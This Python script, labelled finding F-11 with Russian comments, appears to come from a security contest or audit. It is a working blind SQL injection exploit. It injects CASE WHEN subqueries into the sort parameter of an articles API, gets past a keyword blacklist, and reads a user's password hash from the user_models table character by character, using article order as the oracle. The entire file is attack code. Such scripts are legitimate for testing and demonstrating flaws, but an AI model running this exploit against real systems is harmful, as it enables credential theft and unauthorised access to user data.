# -*- coding: utf-8 -*-
"""F-11. sort попадает в ORDER BY. Чёрный список не режет CASE и SELECT.
Порядок статей — оракул для substr(password) из user_models.
"""
import urllib.parse

from _http import Client, parser

ALPHABET = "$./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"


def order(client: Client, sort: str):
    path = "/api/articles/?limit=8&sort=" + urllib.parse.quote(sort, safe="")
    status, data, raw = client.call("GET", path)
    if status != 200 or not data:
        return None
    return tuple(item["slug"] for item in data["articles"])


def main():
    p = parser("Слепое чтение хеша через sort")
    p.add_argument("--email", default="alice@contest.ru")
    p.add_argument("--chars", type=int, default=7)
    args = p.parse_args()
    client = Client(args.base)
    by_title = order(client, "title")
    by_updated = order(client, "updated_at")
    if not by_title or not by_updated or by_title == by_updated:
        raise SystemExit("базовые сортировки не различаются, оракул не на чем строить")
    true_order = order(client, "CASE WHEN (1=1) THEN title ELSE updated_at END")
    false_order = order(client, "CASE WHEN (1=2) THEN title ELSE updated_at END")
    if true_order != by_title or false_order != by_updated:
        raise SystemExit("CASE не управляет порядком")

    found = ""
    for index in range(1, args.chars + 1):
        hit = None
        for ch in ALPHABET:
            cond = (
                "CASE WHEN (SELECT substr(password,%d,1) FROM user_models "
                "WHERE email='%s')='%s' THEN title ELSE updated_at END"
                % (index, args.email, ch)
            )
            if order(client, cond) == by_title:
                hit = ch
                break
        if hit is None:
            break
        found += hit
        print(f"  {found}")
    if not found.startswith("$2"):
        raise SystemExit(f"префикс хеша не извлечён: {found!r}")
    print(f"OK {args.email} prefix={found}")


if __name__ == "__main__":
    main()
